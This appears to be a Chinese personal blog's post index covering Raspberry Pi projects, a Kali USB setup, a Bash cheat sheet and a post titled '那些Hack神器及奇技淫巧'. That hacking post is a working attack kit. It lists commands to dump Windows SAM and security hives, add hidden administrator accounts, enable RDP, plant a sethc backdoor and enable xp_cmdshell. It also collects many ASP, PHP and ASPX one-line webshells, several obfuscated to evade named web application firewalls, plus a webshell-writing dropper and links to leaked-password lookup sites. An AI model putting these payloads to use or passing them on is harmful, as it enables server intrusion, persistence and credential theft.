\n\n注意经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n\nHEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\ntag可能会出问题，会自动加–，请自行删除，或者批量删除\n\n","categories":["Web"],"tags":["Web"]},{"title":"那些Hack神器及奇技淫巧","url":"http://www.yfgeek.com/2016/09/11/那些Hack神器及奇技淫巧/","content":"简介这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n那些网站社工库国内http://www.findmima.com/\nhttp://www.wghostk.com/so/\nhttp://p.08lt.com\nhttp://www.144118.com/\n国际https://haveibeenpwned.com/\nhttps://leakbase.pw/\nC段http://www.144118.com/\nwhois查询http://whois.domaintools.com/\n历史页面那些实用命令reg导出samreg save hklm\\sam sam.hive\nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\nWindows新建用户net user admin$ admin /add\nnet localgroup administrators admin$ /add\nnet user Guest 1234\nnet user Guest /active:yes\nnet localgroup administrators Guest /add\n打开3389(2003,xp)REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\nsethc后门Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\nmssql xpcmdshell报错EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;\n那些一句话asp一句话木马&lt;%eval request(&quot;x&quot;)%&gt;\n\nphp一句话木马&lt;?php eval($_POST[g]);?&gt;\n\naspx一句话&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;\n\n数据库加密一句话(密码a)┼攠數畣整爠煥敵瑳∨≡┩愾\n\n网站配置、版权信息专用一句话&quot;%&gt;&lt;%Eval Request(x)%&gt;\n\n一句话再过护卫神&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;\n\n过拦截一句话木马&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;\n\nasp闭合型一句话%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%\n\n能过安全狗的解析格式;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n\n突破安全狗的一句话&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;\n\nelong过安全狗的php一句话&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;\n\n后台常用写入php一句话（密码x）&lt;?  $fp = @fopen(&quot;c.php&quot;, &#x27;a&#x27;);  @fwrite($fp, &#x27;&lt;&#x27;.&#x27;?php&#x27;.&quot;\\r\\n\\r\\n&quot;.&#x27;eval($_POST[x])&#x27;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;);  @fclose($fp);  ?&gt;\n高强度php一句话&lt;?php substr(md5($_REQUEST[&#x27;heroes&#x27;]),28)==&#x27;acd0&#x27;&amp;&amp;eval($_REQUEST[&#x27;c&#x27;]);?&gt;\n\n新型变异PHP一句话(密码b4dboy)($b4dboy = $_POST[&#x27;b4dboy&#x27;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n\n突破安全狗的aspx一句话&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;\n\n突破护卫神，保护盾一句话&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;test&quot;]); ?&gt;\n\nPHP高强度一句话：&lt;?php substr(md5($_REQUEST[&#x27;x&#x27;]),28)==&#x27;acd0&#x27;&amp;&amp;eval($_REQUEST[&#x27;c&#x27;]);?&gt;  \n\n菜刀连接：/x.php?x=lostwolf  脚本类型：php  密码：c\n&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;\n\naspx过狗&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;\n\n那些神器\nSqlmap\n\n","categories":["Hack"],"tags":["Hack"]},{"title":"树莓派实时温度湿度监测进阶","url":"http://www.yfgeek.com/2016/08/26/树莓派实时温度湿度监测进阶/","content":"这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n依赖\nAdafruit_DHT\nAdafruit_CharLCD\nNginx/Apache (请自行提前安装)\n\n安装依赖sudo apt-get updatesudo apt-get install build-essential python-dev python-smbus python-pipgit clone https://github.com/adafruit/Adafruit_Python_DHT.gitcd Adafruit_Python_DHTsudo python setup.py installsudo pip install RPi.GPIOgit clone https://github.com/adafruit/Adafruit_Python_CharLCDcd Adafruit_Python_CharLCDsudo python setup.py install\n安装cd /var/www/htmlgit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n运行cd /var/www/html/rpi-TempRuntimepython LCD.py\n\n截图\n","categories":[],"tags":["Raspberry"]},{"title":"把KALI放到U盘里","url":"http://www.yfgeek.com/2016/08/25/把KALI放到U盘里/","content":"步骤1：进入 bios设置U盘启动，保存并启动电脑\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n关掉gparted ，在命令行里输入以下命令：\nmkdir /mnt/usbmount /dev/sdb2 /mnt/usbecho &quot;/ union&quot; &gt;&gt; /mnt/usb/persistence.confumount /mnt/usb","categories":[],"tags":["Linux"]},{"title":"基于树莓派的实时温度湿度监测平台","url":"http://www.yfgeek.com/2016/08/25/基于树莓派的实时温度湿度监测平台/","content":"前言很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n \n知识储备\n数字电子技术基础\n微机原理与接口技术\npython语言\n\n原料\n树莓派3B\nDHT11\nLCD1602\n2K电阻（也可以是电位器）\n子-母 和 母-母 杜邦线\n电气绝缘胶带\n剪刀\n一颗耐心和一颗细心\n\n语言\nPython 2.7\n\n组件\npython-dev\npython-rpi.gpio如果不具备以上，请执行：sudo apt-get updatesudo apt-get install python-devsudo apt-get install python-rpi.gpio\n\n\n\n接线我们一共要完成两个任务：\n\n1.连接LCD1602\n2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n2K 电阻如何连接到电路简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\nLCD1602 接线方案LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n树莓派的USB端口朝下，电源线位置朝上方向摆放。右端一共有40个引脚，每个引脚的PIN位置如上。\nVSS，接地，RPi PIN 6VDD，接5V电源，PRi PIN 2VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9RS，寄存器选择，接GPIO 14，RPi PIN 8RW，读写选择，接地，表示写模式，PRi PIN 6E，使能信号，接GPIO 15，RPi PIN 10D0，数据位0，4位工作模式下不用，不接D1，数据位1，4位工作模式下不用，不接D2，数据位2，4位工作模式下不用，不接D3，数据位3，4位工作模式下不用，不接D4，数据位4，接GPIO 17，RPi PIN 11D5，数据位5，接GPIO 18，RPi PIN 12D6，数据位6，接GPIO 27，RPi PIN 13D7，数据位7，接GPIO 22，RPi PIN 15A，液晶屏背光+，接5V，RPi PIN 4K，液晶屏背光-，接地，RPi PIN 39\n连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\nLCD1602 开机测试接通电源线，默认情况下，如果连接正确：\n\n肯定没有爆炸\n会出现如下图的效果，证明你已经接线成功了\n\nDHT11 接线方案接线简单，主要是把数据传输到GPIO26上\nDHT11有3个脚，VCC，DATA，GNDVCC 接 3.3V PIN 01DATA 接 GPIO26 PIN 37GND 接地  PIN 09\n#代码采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n#!/usr/bin/python# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527# rewrite by ivanfrom time import sleepfrom datetime import datetimefrom time import sleepimport commands,timeimport RPi.GPIO as GPIOdef get_tmp():  channel = 37  data = []  j = 0  GPIO.setmode(GPIO.BOARD)  time.sleep(1)  GPIO.setup(channel, GPIO.OUT)  GPIO.output(channel, GPIO.LOW)  time.sleep(0.5)  GPIO.output(channel, GPIO.HIGH)  GPIO.setup(channel, GPIO.IN)  while GPIO.input(channel) == GPIO.LOW:    continue  while GPIO.input(channel) == GPIO.HIGH:    continue  while j &lt; 40:    k = 0    while GPIO.input(channel) == GPIO.LOW:      continue    while GPIO.input(channel) == GPIO.HIGH:      k += 1      if k &gt; 100:        break    if k &lt; 8:      data.append(0)    else:      data.append(1)    j += 1  print &quot;sensor is working.&quot;  print data  humidity_bit = data[0:8]  humidity_point_bit = data[8:16]  temperature_bit = data[16:24]  temperature_point_bit = data[24:32]  check_bit = data[32:40]  humidity = 0  humidity_point = 0  temperature = 0  temperature_point = 0  check = 0  for i in range(8):    humidity += humidity_bit[i] * 2 ** (7-i)    humidity_point += humidity_point_bit[i] * 2 ** (7-i)    temperature += temperature_bit[i] * 2 ** (7-i)    temperature_point += temperature_point_bit[i] * 2 ** (7-i)    check += check_bit[i] * 2 ** (7-i)  tmp = humidity + humidity_point + temperature + temperature_point  if check == tmp:    return &#x27;temp:&#x27; + str(temperature) + &#x27; C \\nhumidity:&#x27; + str(humidity) + &#x27;%&#x27;  else:    get_tmp()  GPIO.cleanup()    class Adafruit_CharLCD:    # commands    LCD_CLEARDISPLAY            = 0x01    LCD_RETURNHOME                  = 0x02    LCD_ENTRYMODESET            = 0x04    LCD_DISPLAYCONTROL          = 0x08    LCD_CURSORSHIFT             = 0x10    LCD_FUNCTIONSET             = 0x20    LCD_SETCGRAMADDR            = 0x40    LCD_SETDDRAMADDR            = 0x80    # flags for display entry mode    LCD_ENTRYRIGHT              = 0x00    LCD_ENTRYLEFT               = 0x02    LCD_ENTRYSHIFTINCREMENT     = 0x01    LCD_ENTRYSHIFTDECREMENT     = 0x00    # flags for display on/off control    LCD_DISPLAYON               = 0x04    LCD_DISPLAYOFF              = 0x00    LCD_CURSORON                = 0x02    LCD_CURSOROFF               = 0x00    LCD_BLINKON                 = 0x01    LCD_BLINKOFF                = 0x00    # flags for display/cursor shift    LCD_DISPLAYMOVE             = 0x08    LCD_CURSORMOVE              = 0x00    # flags for display/cursor shift    LCD_DISPLAYMOVE             = 0x08    LCD_CURSORMOVE              = 0x00    LCD_MOVERIGHT               = 0x04    LCD_MOVELEFT                = 0x00    # flags for function set    LCD_8BITMODE                = 0x10    LCD_4BITMODE                = 0x00    LCD_2LINE                   = 0x08    LCD_1LINE                   = 0x00    LCD_5x10DOTS                = 0x04    LCD_5x8DOTS                 = 0x00    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):        # Emulate the old behavior of using RPi.GPIO if we haven&#x27;t been given        # an explicit GPIO interface to use        if not GPIO:            import RPi.GPIO as GPIO        GPIO.setwarnings(False)        self.GPIO = GPIO        self.pin_rs = pin_rs        self.pin_e = pin_e        self.pins_db = pins_db        self.GPIO.setmode(GPIO.BOARD)        self.GPIO.setup(self.pin_e, GPIO.OUT)        self.GPIO.setup(self.pin_rs, GPIO.OUT)        for pin in self.pins_db:            self.GPIO.setup(pin, GPIO.OUT)        self.write4bits(0x33) # initialization        self.write4bits(0x32) # initialization        self.write4bits(0x28) # 2 line 5x7 matrix        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor        self.write4bits(0x06) # shift cursor right        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS        self.displayfunction |= self.LCD_2LINE        &quot;&quot;&quot; Initialize to default text direction (for romance languages) &quot;&quot;&quot;        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode        self.clear()    def begin(self, cols, lines):        if (lines &gt; 1):                self.numlines = lines                self.displayfunction |= self.LCD_2LINE                self.currline = 0    def home(self):        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero        self.delayMicroseconds(3000) # this command takes a long time!    def clear(self):        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time    def setCursor(self, col, row):        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]        if ( row &gt; self.numlines ):                 row = self.numlines - 1 # we count rows starting w/0        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))    def noDisplay(self):         &quot;&quot;&quot; Turn the display off (quickly) &quot;&quot;&quot;        self.displaycontrol &amp;= ~self.LCD_DISPLAYON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def display(self):        &quot;&quot;&quot; Turn the display on (quickly) &quot;&quot;&quot;        self.displaycontrol |= self.LCD_DISPLAYON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def noCursor(self):        &quot;&quot;&quot; Turns the underline cursor on/off &quot;&quot;&quot;        self.displaycontrol &amp;= ~self.LCD_CURSORON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def cursor(self):        &quot;&quot;&quot; Cursor On &quot;&quot;&quot;        self.displaycontrol |= self.LCD_CURSORON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def noBlink(self):        &quot;&quot;&quot; Turn on and off the blinking cursor &quot;&quot;&quot;        self.displaycontrol &amp;= ~self.LCD_BLINKON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def noBlink(self):        &quot;&quot;&quot; Turn on and off the blinking cursor &quot;&quot;&quot;        self.displaycontrol &amp;= ~self.LCD_BLINKON        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)    def DisplayLeft(self):        &quot;&quot;&quot; These commands scroll the display without changing the RAM &quot;&quot;&quot;        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)    def scrollDisplayRight(self):        &quot;&quot;&quot; These commands scroll the display without changing the RAM &quot;&quot;&quot;        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);    def leftToRight(self):        &quot;&quot;&quot; This is for text that flows Left to Right &quot;&quot;&quot;        self.displaymode |= self.LCD_ENTRYLEFT        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);    def rightToLeft(self):        &quot;&quot;&quot; This is for text that flows Right to Left &quot;&quot;&quot;        self.displaymode &amp;= ~self.LCD_ENTRYLEFT        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)    def autoscroll(self):        &quot;&quot;&quot; This will &#x27;right justify&#x27; text from the cursor &quot;&quot;&quot;        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)    def noAutoscroll(self):         &quot;&quot;&quot; This will &#x27;left justify&#x27; text from the cursor &quot;&quot;&quot;        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)    def write4bits(self, bits, char_mode=False):        &quot;&quot;&quot; Send command to LCD &quot;&quot;&quot;        self.delayMicroseconds(1000) # 1000 microsecond sleep        bits=bin(bits)[2:].zfill(8)        self.GPIO.output(self.pin_rs, char_mode)        for pin in self.pins_db:            self.GPIO.output(pin, False)        for i in range(4):            if bits[i] == &quot;1&quot;:                self.GPIO.output(self.pins_db[::-1][i], True)        self.pulseEnable()        for pin in self.pins_db:            self.GPIO.output(pin, False)        for i in range(4,8):            if bits[i] == &quot;1&quot;:                self.GPIO.output(self.pins_db[::-1][i-4], True)        self.pulseEnable()    def delayMicroseconds(self, microseconds):        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds        sleep(seconds)    def pulseEnable(self):        self.GPIO.output(self.pin_e, False)        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be &gt; 450ns         self.GPIO.output(self.pin_e, True)        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be &gt; 450ns         self.GPIO.output(self.pin_e, False)        self.delayMicroseconds(1)               # commands need &gt; 37us to settle    def message(self, text):        &quot;&quot;&quot; Send string to LCD. Newline wraps to second line&quot;&quot;&quot;        for char in text:            if char == &#x27;\\n&#x27;:                self.write4bits(0xC0) # next line            else:                self.write4bits(ord(char),True)if __name__ == &#x27;__main__&#x27;:    while True:        tmp = get_tmp()         if tmp:            lcd = Adafruit_CharLCD()            lcd.noBlink()            lcd.clear()            lcd.message(tmp)        sleep(5)\n运行效果\n\n参考资料https://gist.github.com/hugozhu/6166527https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5fhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.pyhttp://blog.csdn.net/xukai871105/article/details/12684617https://www.oschina.net/question/1425530\\_140979http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.htmlhttp://blog.csdn.net/netccy/article/details/48098455https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.htmlhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.htmlhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.htmlhttp://blog.csdn.net/rocklee/article/details/50082777http://www.guokr.com/post/718305/http://www.rs-online.com/designspark/electronics/blog/content-1148http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.htmlhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtmlhttp://blog.csdn.net/u013431550/article/details/40870947http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69bahttp://blog.csdn.net/longerzone/article/details/36171381\n","categories":[],"tags":["Raspberry"]},{"title":"我怀念的依旧是916","url":"http://www.yfgeek.com/2016/08/20/我怀念的依旧是916/","content":"本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n916桌子很多，却都是空位，但是有基友陪伴。\n \n\n916有dong dong dong，充满回忆。\n916从来不用占座，却可以假装学习。\n916通宵加零食，空调WI-FI感觉人生圆满了。\n916有沙发有地铺，住在学校里的快捷酒店。\n916极大地方便了生活，Linux的帮忙少不了。\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n自由自在，想做什么做什么。\n当然，我也不会忘记，\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n十点后进入害怕遇到搜查，爬九楼的故事；\n隔壁传来的dongdongdong声音和30GB的故事。\n","categories":[],"tags":["杂谈"]},{"title":"海外App生存指南","url":"http://www.yfgeek.com/2016/08/12/海外App生存指南/","content":" \nDNS/PAC大法优酷土豆爱奇艺在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\nhttp://pac.uku.im/pac.pac\n\nDNS:\n158.69.209.100\n更新：https://github.com/uku/Unblock-Youku/issues/618\n替换hosts大法网易云音乐104.236.189.178 http://music.163.com 198.47.104.134 http://m1.music.126.net 198.47.104.134 http://m2.music.126.net 198.47.104.134 http://m3.music.126.net 198.47.104.134 http://m4.music.126.net198.47.104.134 http://m5.music.126.net 198.47.104.134 http://m6.music.126.net 198.47.104.134 http://m7.music.126.net 198.47.104.134 http://m8.music.126.net 198.47.104.134 http://m9.music.126.net 198.47.104.134 http://m10.music.126.net\n","categories":[],"tags":["其他"]},{"title":"用树莓派把蓝牙音响变成Airplay音响","url":"http://www.yfgeek.com/2016/08/07/用树莓派把蓝牙音响变成Airplay音响/","content":"前言最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n\niOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱\n\n \n\n因此这个问题可以分为两个部分：\n\n1.树莓派蓝牙音频配置部分\n2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n原料\n树莓派3\n小米蓝牙音箱\niOS设备\n\n开始树莓派安装Shairport SyncShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。安装前请确认是否安装以下依赖包：\n\napt-get install build-essential git\napt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev\napt-get install avahi-daemon libavahi-client-dev \napt-get install libssl-dev \napt-get install libpolarssl-dev \napt-get install libsoxr-dev \n\n随后下载Shairport Sync：\ngit clone https://github.com/mikebrady/shairport-sync.git\n然后cd到相应目录，执行：\nautoreconf -i -f\n随后执行：\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\nmake\n创建开机启动：\ngetent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/nullgetent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync &gt;/dev/null\n然后运行：\nsudo make install\n最后输入，完成安装：\nsudo update-rc.d shairport-sync defaults 90 10\n树莓派安装蓝牙打开终端，用普通用户权限执行：\nsudo apt-get updatesudo apt-get updgrade -ysudo apt-get dist-upgrade -y\n随后安装蓝牙及管理软件\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n将pi用户添加到蓝牙组\nsudo usermod -G bluetooth -a pi\n还有很重要的一条，安装蓝牙音频配置\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。也可通过bluetoothctl或hictool命令进行配对。随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。\n配置蓝牙音频及Shariport Sync安装依赖包：\nsudo apt-get install libdbus-1-devsudo apt-get install libglib2.0-devapt-cache search libasoundsudo apt-get install libasound2-dev\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xztar -xvf bluez-4.101.tar.xzcd bluez-4.101./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/libmakesudo make install\n复制配置文件到目录：\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agentsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-devicesudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audiosudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n接着运行：\nsudo apt-get install python-dbussudo apt-get install python-gobjectsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\nsudo nano /etc/bluetooth/audio.conf\n# 在[General]区域添加:Enable=Sink,Socket# 取消[A2DP]注释，并加入:Maxconnections=4\n打开蓝牙自启动:\nsudo systemctl enable bluetooth\n重启设备后，继续配置，打开asund.conf文件：\nsudo nano /etc/asound.conf\npcm.bt_canz &#123;type plugslave &#123;pcm &#123;type bluetoothdevice XX:XX:XX:XX:XX:XXprofile &quot;auto&quot;&#125;&#125;hint &#123;show ondescription &quot;Mi Speaker&quot;&#125;&#125;ctl.bt_canz &#123;type bluetooth&#125;\n测试bluez能否使用：sudo bluez-simple-agent ，如果正常，按ctrl+c停止。\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XXsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n测试是否连通：speaker-test -c 2 -D bt_canz\n再次重启设备。开启后编辑/etc/shairport-sync.conf ：\nsudo nano /etc/shairport-sync.conf#去掉下面的注释，并加入bt_canzoutput_device = bt_canz\n保存！重启！开机即可用。\n参考文章https://github.com/mikebrady/shairport-sync/issues/200https://github.com/mikebrady/shairport-synchttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.htmlhttp://wangye.org/blog/archives/921/http://blog.csdn.net/huayucong/article/details/51376461http://blog.csdn.net/zhaoqi_0612/article/details/47731821http://blog.csdn.net/techtitan/article/details/6165116http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\n","categories":[],"tags":["Raspberry"]},{"title":"常用Bash命令总结","url":"http://www.yfgeek.com/2016/08/06/常用Bash命令总结/","content":"自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n \n\n日常\nctrl + a #命令跳转到句首\nctrl + r #命令搜索模式\nTAB #命令自动补全\npwd #显示当前路径\ntar -cvf mytest.tar mytest/  #对mytest目录打包\ntar -xvf mytest.tar  #解压tar文件\ntar -xvf mytest.tar -C /opt/setups/ #解压到特殊目录\nfind / -name *.conf #查找/下的所有conf文件\ndu -sh ./* #查看当前文件夹下的空间占用情况\nmore #分页查看\nwhich #查看目录\nlocate #快速搜索\n\n安全\nwho #当前登录情况\nlast #最近登录情况\ncat /etc/passwd |awk -F \\: &#39;&#123;print $1&#125;&#39; #系统所有用户\nchkconfig #启动项检查\nnetstat -lnp #端口情况\nuptime #系统开机多久了\nsudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT  #允许访问 80 端口\n\n一句话命令脚本中切换用户\nsu - test -c &quot;pwd&quot;\n\n连接到你服务器端口的ip\nnetstat -tun|grep 7890|sort|awk &#x27;&#123;print $5&#125;&#x27;|cut -d : -f 1|uniq \n常用功能#定时任务使用-l参数列出crontab文件:\ncrontab -l\n编辑crontab文件\ncrontab -e\n实例1：每1分钟执行一次myCommand\n* * * * * myCommand\n实例2：每小时的第3和第15分钟执行\n3,15 * * * * myCommand\n实例3：在上午8点到11点的第3和第15分钟执行\n3,15 8-11 * * * myCommand\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n3,15 8-11 */2  *  * myCommand\n实例5：每周一上午8点到11点的第3和第15分钟执行\n3,15 8-11 * * 1 myCommand\n实例6：每晚的21:30重启smb\n30 21 * * * /etc/init.d/smb restart\n实例7：每月1、10、22日的4 : 45重启smb\n45 4 1,10,22 * * /etc/init.d/smb restart\n实例8：每周六、周日的1 : 10重启smb\n10 1 * * 6,0 /etc/init.d/smb restart\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n0,30 18-23 * * * /etc/init.d/smb restart\n实例10：每星期六的晚上11 : 00 pm重启smb\n0 23 * * 6 /etc/init.d/smb restart\n实例11：每一小时重启smb\n* */1 * * * /etc/init.d/smb restart\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n* 23-7/1 * * * /etc/init.d/smb restart\n#scp实例1：从远处复制文件到本地目录\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n实例2：从远处复制到本地\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n实例3：上传本地文件到远程机器指定目录\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n实例4：上传本地目录到远程机器指定目录\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n","categories":[],"tags":["Linux"]},{"title":"Kali系列——信息收集阶段（二）","url":"http://www.yfgeek.com/2016/08/01/Kali系列——信息收集阶段（二）/","content":" \nfierece暴力破解dns解析\nroot@kali:~# fierce -dns dbstye.netTrying zone transfer first...Unsuccessful in zone transfer 